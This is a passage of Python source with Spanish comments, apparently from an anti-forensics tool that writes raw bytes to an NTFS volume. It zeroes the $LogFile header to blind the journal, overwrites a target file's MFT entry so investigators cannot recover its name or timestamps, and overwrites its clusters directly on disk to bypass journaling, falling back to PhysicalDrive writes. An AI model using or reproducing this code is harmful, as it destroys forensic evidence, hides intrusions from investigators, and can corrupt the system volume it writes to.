            ok = _k32.WriteFile(h, bytes(sector_data), len(sector_data), ctypes.byref(written), None)
            return bool(ok)
        finally:
            _k32.CloseHandle(h)

    # ----------------------------------------------------------
    # $LOGFILE CORRUPTION
    # ----------------------------------------------------------

    def zero_logfile_header(self, logger) -> bool:
        """
        Corrompe el header del $LogFile (NTFS transaction log).
        
        Técnica: Zerear los primeros 4KB del $LogFile invalida el
        checkpoint header que NTFS usa para replay de transacciones.
        Al montar el volumen, NTFS detecta el $LogFile como 'dirty'
        y lo reconstruye vacío — no quedan transacciones previas.
        
        A diferencia del USN Journal, el $LogFile es IMPOSIBLE de
        limpiar desde user-mode sin raw volume access.
        """
        try:
            if not self._vbr:
                if not self._read_vbr():
                    logger("→ [KERNEL] $LogFile: Could not parse NTFS VBR.")
                    return False

            # $LogFile es siempre MFT record #2
            # Obtener su LCN leyendo el MFT record directamente
            mft_offset = self._lcn_to_volume_offset(self._mft_lcn)
            bytes_per_cluster = self._bytes_per_sector * self._sectors_per_cluster
            mft_record_size   = 1024  # Estándar, puede ser 4096 en algunos sistemas

            # Leer MFT record 2 ($LogFile)
            logfile_record_offset = mft_offset + (2 * mft_record_size)
            record_data = self.read_volume_bytes(logfile_record_offset, mft_record_size)

            if not record_data or record_data[:4] != b'FILE':
                logger("→ [KERNEL] $LogFile: MFT record 2 not found or invalid.")
                return False

            # Parsear el run list para encontrar el LCN del $LogFile
            logfile_lcn = self._parse_mft_data_lcn(record_data)
            if logfile_lcn is None:
                logger("→ [KERNEL] $LogFile: Could not parse run list.")
                return False

            # Offset del primer cluster del $LogFile
            logfile_offset = self._lcn_to_volume_offset(logfile_lcn)

            # Zerear los primeros 8KB del $LogFile (dos páginas de restart area)
            zeros = b'\x00' * 8192
            ok = self.write_volume_bytes(logfile_offset, zeros)

            if ok:
                logger("→ [KERNEL] $LogFile header ZEROED. NTFS journal: BLIND.")
                logger("→ [KERNEL] No transaction history survives this boot.")
            else:
                logger("→ [KERNEL] $LogFile: Write failed (may need PhysicalDrive access).")
            return ok

        except Exception as e:
            logger(f"→ [KERNEL] $LogFile error: {e}")
            return False

    def _parse_mft_data_lcn(self, record_data: bytes):
        """Parsea el primer LCN de la Data run list del MFT record."""
        try:
            # Offset del primer atributo (desde el campo 'attr_offset' en el FILE record header)
            attr_offset = struct.unpack_from("<H", record_data, 0x14)[0]
            pos = attr_offset

            while pos < len(record_data) - 4:
                attr_type = struct.unpack_from("<I", record_data, pos)[0]
                if attr_type == 0xFFFFFFFF:
                    break
                attr_len = struct.unpack_from("<I", record_data, pos + 4)[0]
                if attr_len == 0:
                    break

                # Tipo 0x80 = $DATA attribute
                if attr_type == 0x80:
                    non_resident = record_data[pos + 8]
                    if non_resident:
                        # Non-resident: obtener run list
                        run_offset = struct.unpack_from("<H", record_data, pos + 0x20)[0]
                        run_pos = pos + run_offset
                        # Parsear el primer run
                        header = record_data[run_pos]
                        if header == 0:
                            break
                        len_size    = header & 0x0F
                        offset_size = (header >> 4) & 0x0F
                        if len_size + offset_size + 1 > len(record_data) - run_pos:
                            break
                        # Ignorar length, obtener offset LCN
                        lcn_bytes = record_data[run_pos+1+len_size : run_pos+1+len_size+offset_size]
                        # Sign-extend
                        lcn = int.from_bytes(lcn_bytes, 'little', signed=True)
                        return lcn

                pos += attr_len
            return None
        except:
            return None

    # ----------------------------------------------------------
    # MFT ENTRY ZEROING
    # ----------------------------------------------------------

    def zero_mft_entry(self, target_path: str, logger) -> bool:
        """
        Zerear el entry del MFT del archivo objetivo.
        
        Después de esto, el archivo no solo está borrado:
        su slot en el MFT queda en zeros, como si nunca
        hubiera existido. Forensics no puede reconstruir
        nombre, tamaño, timestamps ni clusters.
        """
        try:
            if not self._vbr:
                if not self._read_vbr():
                    logger("→ [KERNEL] MFT zero: Could not parse VBR.")
                    return False

            # Usar FSCTL_GET_NTFS_FILE_RECORD para obtener el file reference
            h_vol = _open_handle(self.volume_path, read=True, write=False)
            if h_vol is None:
                logger("→ [KERNEL] MFT zero: Cannot open volume.")
                return False

            # Obtener file reference number
            h_file = _k32.CreateFileW(
                target_path,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING,
                0x02000000,  # FILE_FLAG_BACKUP_SEMANTICS
                None
            )

            file_ref = None
            if h_file and h_file != INVALID_HANDLE_VALUE:
                # GetFileInformationByHandle para obtener file index
                class BY_HANDLE_INFO(ctypes.Structure):
                    _fields_ = [
                        ("dwFileAttributes", wintypes.DWORD),
                        ("ftCreationTime",   wintypes.FILETIME),
                        ("ftLastAccessTime", wintypes.FILETIME),
                        ("ftLastWriteTime",  wintypes.FILETIME),
                        ("dwVolumeSerialNumber", wintypes.DWORD),
                        ("nFileSizeHigh",    wintypes.DWORD),
                        ("nFileSizeLow",     wintypes.DWORD),
                        ("nNumberOfLinks",   wintypes.DWORD),
                        ("nFileIndexHigh",   wintypes.DWORD),
                        ("nFileIndexLow",    wintypes.DWORD),
                    ]
                info = BY_HANDLE_INFO()
                if _k32.GetFileInformationByHandle(h_file, ctypes.byref(info)):
                    file_ref = (info.nFileIndexHigh << 32) | info.nFileIndexLow
                _k32.CloseHandle(h_file)
            _k32.CloseHandle(h_vol)

            if file_ref is None:
                logger("→ [KERNEL] MFT zero: Could not get file reference.")
                return False

            # Calcular offset del MFT entry
            mft_offset = self._lcn_to_volume_offset(self._mft_lcn)
            mft_record_size = 1024
            entry_offset = mft_offset + (file_ref * mft_record_size)

            # Sobreescribir con random + zeros (anti-carving)
            payload = os.urandom(mft_record_size // 2) + b'\x00' * (mft_record_size // 2)
            ok = self.write_volume_bytes(entry_offset, payload)

            if ok:
                logger(f"→ [KERNEL] MFT entry zerod for '{os.path.basename(target_path)}'. File reference {file_ref:#x} annihilated.")
            else:
                logger("→ [KERNEL] MFT zero: Write blocked (trying PhysicalDrive...).")
                self._get_partition_offset()
                ok = self._write_physical(entry_offset, payload)
                if ok:
                    logger("→ [KERNEL] MFT entry zeroed via PhysicalDrive.")

            return ok

        except Exception as e:
            logger(f"→ [KERNEL] MFT zero error: {e}")
            return False

    def overwrite_clusters(self, target_path: str, logger) -> bool:
        """
        Obtiene los clusters exactos del archivo y los sobreescribe
        directamente en el disco, bypaseando el NTFS journaling.
        Complemento al shred normal — garantiza que el journaling
        no rastrea la operación de sobreescritura.
        """
        try:
            h = _k32.CreateFileW(
                target_path,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, 0, None
            )
            if not h or h == INVALID_HANDLE_VALUE:
                return False

            # FSCTL_GET_RETRIEVAL_POINTERS — obtiene los VCN→LCN mappings
            start_vcn = ctypes.c_int64(0)
            out_buf   = ctypes.create_string_buffer(4096)
            returned  = wintypes.DWORD(0)
            ok = _k32.DeviceIoControl(
                h,
                FSCTL_GET_RETRIEVAL_POINTERS,
                ctypes.byref(start_vcn), 8,
                out_buf, 4096,
                ctypes.byref(returned),
                None
            )
            _k32.CloseHandle(h)

            if not ok:
                return False

            data          = bytes(out_buf[:returned.value])
            extent_count  = struct.unpack_from("<I", data, 0)[0]
            bytes_per_cluster = self._bytes_per_sector * self._sectors_per_cluster
            pos = 8  # Skip ExtentCount + StartingVcn

            overwritten = 0
            for _ in range(extent_count):
                if pos + 16 > len(data):
                    break
                next_vcn = struct.unpack_from("<q", data, pos)[0]
                lcn      = struct.unpack_from("<q", data, pos + 8)[0]
                pos += 16
                if lcn == -1:
                    continue
                volume_off = self._lcn_to_volume_offset(lcn)
                cluster_bytes = next_vcn * bytes_per_cluster  # Aproximación
                # Sobreescribir clusters con random
                noise = os.urandom(min(cluster_bytes, 65536))
                self.write_volume_bytes(volume_off, noise)
                overwritten += len(noise)

            if overwritten:
                logger(f"→ [KERNEL] Cluster-level overwrite: {overwritten//1024}KB written directly to disk (no journal).")
            return True

        except Exception as e:
            logger(f"→ [KERNEL] Cluster overwrite error: {e}")
            return False


# ============================================================
# SINGLETON INSTANCES
# ============================================================

_pmem_driver = WinPmemDriver()
_raw_ntfs    = RawNTFS("C")

def get_pmem() -> WinPmemDriver:
    return _pmem_driver

def get_ntfs() -> RawNTFS:
    return _raw_ntfs

def is_kernel_armed() -> bool:
    return _pmem_driver.armed
